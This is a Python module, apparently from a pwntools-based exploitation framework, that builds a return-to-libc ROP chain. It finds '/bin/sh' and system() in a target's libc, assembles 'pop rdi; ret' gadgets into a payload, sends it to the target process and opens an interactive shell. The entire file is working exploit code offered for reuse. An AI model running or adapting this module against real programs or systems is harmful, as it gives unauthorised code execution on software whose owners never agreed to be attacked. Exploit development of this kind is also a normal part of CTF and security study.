import typing
from typing import Optional

from abstract.module import AbstractModule
from core.targetbase import TargetBase
from pwn import p64


class ExecShell(AbstractModule):
    @classmethod
    def execute(cls, target: TargetBase, handler: typing.Callable = None, *args, **kwargs) -> Optional:
        cls.logger.info(f"Running {cls.__name__} module")
        cls.logger.info("Looking for /bin/sh in the executable")
        bin_sh_string = b'/bin/sh\0'
        bin_sh_ptr = next(target.libc.search(bin_sh_string), None)
        if bin_sh_ptr is None:
            cls.logger.critical(f"Failed to find /bin/sh in libc")
            return None

        system_ptr = target.libc.symbols["system"]
        pop_rdi = target.rop.find_gadget(['pop rdi', 'ret']).address + target.base_address_fix
        ret = target.rop.find_gadget(['ret']).address + target.base_address_fix

        cls.logger.info(f"pop rdi gadget: {hex(pop_rdi)}")
        cls.logger.info(f"'/bin/sh' ptr {hex(bin_sh_ptr)}")
        cls.logger.info(f"system ptr {hex(system_ptr)}")

        rop_chain = p64(ret) + p64(pop_rdi) + p64(bin_sh_ptr) + p64(system_ptr)
        payload = target.create_payload(rop_chain)

        cls.logger.info(f"Sending payload. Payload size = {hex(len(payload))}")
        if handler:
            handler(target, payload)
        else:
            target.run_main(payload)
        cls.logger.success(f"Switching to interactive mode")
        target.process.interactive()
        return True
